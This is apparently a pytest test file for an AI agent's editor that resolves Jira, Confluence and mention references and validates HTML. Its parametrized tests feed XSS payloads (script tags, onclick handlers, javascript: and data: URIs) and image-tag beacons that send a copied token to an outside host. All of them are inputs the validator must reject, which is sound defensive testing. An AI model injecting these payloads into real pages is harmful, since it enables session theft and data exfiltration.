from __future__ import annotations

from types import SimpleNamespace

import pytest

from app.agent.editor_author import _badgeify
from app.agent.references import (render_editor_references, render_template,
                                  resolve_references, validate_editor_html)
from app.agent.tools import _ctx


class _Provider:
    def get_json(self, path, params=None):
        if path.endswith("/user") and (params or {}).get("username") == "skcc.x1001":
            return {"name": "skcc.x1001", "displayName": "홍길동"}
        return {}


class _Client:
    provider = _Provider()

    def ticket_badge(self, key):
        if key == "AAA-1":
            return {"key": key, "summary": "허용 티켓", "type": "Bug", "status": "Open"}
        return {}

    def confluence_page(self, page_id, expand=""):
        if str(page_id) == "42":
            return {"id": "42", "title": "설계 문서", "space": {"key": "SPACE1"},
                    "version": {"when": "2026-08-10"},
                    "_links": {"webui": "/pages/42"}}
        return {}


@pytest.fixture(autouse=True)
def _bind_reference_client():
    settings = SimpleNamespace(
        search_jira_projects=["AAA"], search_confluence_spaces=["SPACE1"],
        jira_base="https://jira.example", confluence_base="https://conf.example")
    _ctx.bind(_Client(), settings)
    yield
    _ctx.bind()


def test_reference_resolution_enforces_jira_and_confluence_search_scope():
    result = resolve_references([
        {"id": "t1", "kind": "ticket", "key": "AAA-1"},
        {"id": "t2", "kind": "ticket", "key": "PRIMARY-9"},
        {"id": "d1", "kind": "document", "page_id": "42"},
        {"id": "p1", "kind": "person", "user_id": "skcc.x1001"},
    ])
    by_id = {x["id"]: x for x in result["references"]}
    assert by_id["t1"]["resolved"] is True
    assert by_id["d1"]["space"] == "SPACE1"
    assert by_id["p1"]["mention"] == "[~skcc.x1001]"
    assert by_id["t2"]["resolved"] is False
    assert "search.jira.projects" in by_id["t2"]["error"]


def test_template_renders_only_resolved_placeholders_and_escapes_raw_html():
    resolved = resolve_references([
        {"id": "t1", "kind": "ticket", "key": "AAA-1"},
        {"id": "p1", "kind": "person", "user_id": "skcc.x1001"},
    ])["references"]
    result = render_template(
        "<script>alert(1)</script> {{ref:t1}} 담당 {{mention:p1}} {{ref:missing}}",
        resolved,
    )
    assert result["ok"] is False and result["missing"] == ["missing"]
    assert "&lt;script&gt;" in result["html"] and "<script>" not in result["html"]
    assert "https://jira.example/browse/AAA-1" in result["html"]
    assert 'data-uid="skcc.x1001"' in result["html"]


def test_badgeify_does_not_create_nested_anchors_or_badge_out_of_scope_keys():
    value = ('<p><a href="https://x.example">AAA-1</a> AAA-1 PRIMARY-9 '
             '[~skcc.x1001]</p>')
    rendered = _badgeify(value)
    assert rendered.count("<a ") == 2
    assert '<a href="https://x.example">AAA-1</a>' in rendered
    assert rendered.count('data-key="AAA-1"') == 1
    assert "PRIMARY-9" in rendered and 'data-key="PRIMARY-9"' not in rendered
    assert rendered.count('data-type="mention"') == 1


def test_badgeify_canonicalizes_ticket_key_href_from_model_html():
    rendered = _badgeify('<p><a href="AAA-1">AAA-1</a></p>')
    assert 'href="/browse/AAA-1"' in rendered
    assert 'class="jira-badge tkt"' in rendered
    assert 'data-key="AAA-1"' in rendered
    assert 'href="AAA-1"' not in rendered


def test_editor_reference_renderer_preserves_only_verified_canonical_entities():
    """Editor success carries the same typed references as the resolver, not raw labels."""
    resolved = resolve_references([
        {"id": "ticket:AAA-1", "kind": "ticket", "key": "AAA-1"},
        {"id": "person:skcc.x1001", "kind": "person", "user_id": "skcc.x1001"},
        {"id": "url:0", "kind": "document", "page_id": "42",
         "url": "https://conf.example/pages/42"},
        {"id": "url:1", "kind": "external", "url": "https://docs.example/guide",
         "label": "공식 가이드"},
    ])["references"]
    source = ('<p><a href="AAA-1">AAA-1</a> '
              '<span data-type="mention" data-id="skcc.x1001">@skcc.x1001</span> '
              '<a href="https://conf.example/pages/42">임시 문서명</a> '
              '<a href="https://docs.example/guide">공식 가이드</a></p>')

    rendered = render_editor_references(source, resolved)
    checked = validate_editor_html(rendered, resolved)

    assert checked["ok"] is True
    assert 'class="jira-badge tkt"' in rendered and 'data-key="AAA-1"' in rendered
    assert 'data-type="mention"' in rendered and 'data-id="skcc.x1001"' in rendered
    assert 'class="conf-link"' in rendered and ">설계 문서</a>" in rendered
    assert 'class="ref-link"' in rendered and ">공식 가이드</a>" in rendered
    assert "임시 문서명" not in rendered


def test_editor_final_validator_rejects_pseudo_identity_and_raw_rendering_syntax():
    source = ("<p>D-9040 @ghost.user [~ghost.user]</p>\n"
              "## 검토 결과\n[문서](https://docs.example/guide)\n```text\nraw\n```")

    result = validate_editor_html(source, [])

    assert result["ok"] is False
    assert {item["code"] for item in result["issues"]} >= {
        "unresolved_ticket", "raw_mention", "markdown", "bare_url",
    }


def test_editor_validator_does_not_treat_literal_h2_inside_prose_as_a_heading():
    result = validate_editor_html(
        "<p>사용자 seed의 literal h2. 문자열은 그대로 보존해 주세요.</p>", [])

    assert result["ok"] is True


@pytest.mark.parametrize("href", ["javascript:alert(1)", "data:text/html,boom"])
def test_editor_validator_rejects_non_http_unresolved_anchors(href):
    result = validate_editor_html(f'<p><a href="{href}">unsafe</a></p>', [])

    assert result["ok"] is False
    assert any(item["code"] == "unresolved_reference" for item in result["issues"])


@pytest.mark.parametrize("destination", ["javascript:alert(1)", "data:text/html,boom",
                                          "file:///tmp/private.txt"])
def test_editor_validator_rejects_unsafe_markdown_destinations_without_erasing_them(destination):
    raw = f"[검토 자료]({destination})"

    assert validate_editor_html(raw, [])["ok"] is False


@pytest.mark.parametrize("payload", [
    '<script>alert(1)</script>',
    '<p onclick="steal()">본문</p>',
    '<iframe srcdoc="<script>x</script>"></iframe>',
    '<img src="javascript:alert(1)">',
    '<span style="background:url(javascript:alert(1))">본문</span>',
])
def test_editor_reference_renderer_cannot_bypass_unsafe_html_gate(payload):
    rendered = render_editor_references(payload, [])
    result = validate_editor_html(rendered, [])

    assert result["ok"] is False
    assert any(item["code"] == "unsafe_html" for item in result["issues"])


@pytest.mark.parametrize("payload", [
    '<p>review</p><img src="http://127.0.0.1:4457/api/private">',
    '<img src="https://example.invalid/track?token=copied-secret">',
    '<video poster="http://10.0.0.5/private"></video>',
    '<svg><use xlink:href="https://example.invalid/icon.svg#x"></use></svg>',
    '<img srcset="https://example.invalid/a 1x, https://example.invalid/b 2x">',
])
def test_editor_reference_renderer_rejects_model_controlled_network_media(payload):
    rendered = render_editor_references(payload, [])
    result = validate_editor_html(rendered, [])

    assert result["ok"] is False
    assert any(item["code"] == "unsafe_html" for item in result["issues"])
